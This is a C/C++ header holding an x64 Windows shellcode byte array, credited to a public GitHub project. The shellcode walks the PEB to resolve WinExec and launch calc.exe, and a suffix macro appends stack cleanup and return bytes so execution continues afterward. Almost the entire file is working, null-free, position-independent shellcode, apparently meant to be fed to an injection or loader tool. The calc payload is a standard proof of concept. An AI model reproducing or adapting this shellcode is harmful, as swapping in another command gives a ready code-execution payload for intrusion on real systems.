#pragma once
//  To avoid exception after calc.exe execution
//  shellcode works without this
#define SUFFIX "\x59\x59\x59\x59\x59\x59\x59\xC3"

// https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode
const unsigned char shellcode[] =
    "\x48\x31\xFF\x48\xF7\xE7\x65\x48\x8B\x58\x60\x48\x8B\x5B\x18\x48\x8B\x5B"
    "\x20\x48\x8B\x1B\x48\x8B\x1B\x48\x8B\x5B\x20\x49\x89\xD8\x8B"
    "\x5B\x3C\x4C\x01\xC3\x48\x31\xC9\x66\x81\xC1\xFF\x88\x48\xC1\xE9\x08\x8B"
    "\x14\x0B\x4C\x01\xC2\x4D\x31\xD2\x44\x8B\x52\x1C\x4D\x01\xC2"
    "\x4D\x31\xDB\x44\x8B\x5A\x20\x4D\x01\xC3\x4D\x31\xE4\x44\x8B\x62\x24\x4D"
    "\x01\xC4\xEB\x32\x5B\x59\x48\x31\xC0\x48\x89\xE2\x51\x48\x8B"
    "\x0C\x24\x48\x31\xFF\x41\x8B\x3C\x83\x4C\x01\xC7\x48\x89\xD6\xF3\xA6\x74"
    "\x05\x48\xFF\xC0\xEB\xE6\x59\x66\x41\x8B\x04\x44\x41\x8B\x04"
    "\x82\x4C\x01\xC0\x53\xC3\x48\x31\xC9\x80\xC1\x07\x48\xB8\x0F\xA8\x96\x91"
    "\xBA\x87\x9A\x9C\x48\xF7\xD0\x48\xC1\xE8\x08\x50\x51\xE8\xB0"
    "\xFF\xFF\xFF\x49\x89\xC6\x48\x31\xC9\x48\xF7\xE1\x50\x48\xB8\x9C\x9E\x93"
    "\x9C\xD1\x9A\x87\x9A\x48\xF7\xD0\x50\x48\x89\xE1\x48\xFF\xC2"
    "\x48\x83\xEC\x20\x41\xFF\xD6" SUFFIX;